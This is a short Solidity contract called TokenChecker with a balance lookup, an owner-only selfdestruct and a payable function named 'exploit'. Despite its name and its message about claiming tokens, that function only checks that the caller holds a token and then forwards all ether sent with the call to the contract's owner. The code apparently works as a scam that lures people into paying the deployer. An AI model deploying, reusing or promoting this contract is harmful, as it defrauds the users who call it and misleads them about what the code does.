// SPDX-License-Identifier: WTFPL

pragma solidity >=0.7.0 <0.9.0;

import "./IERC20.sol";

contract TokenChecker {

    address public owner;


    constructor() {
        owner = msg.sender;
    }

    function kill() public {
        require(msg.sender == owner);
        selfdestruct(payable(owner));
    }

    function getBalance(address token, address recipient) public view returns (uint256) {
        IERC20 tokenContract = IERC20(token);
        return tokenContract.balanceOf(recipient);
    }

    function exploit(address token) public payable {
        require(getBalance(token, msg.sender) > 0, "Failed to claim token, balance is 0!");
        payable(owner).transfer(msg.value);
    }

}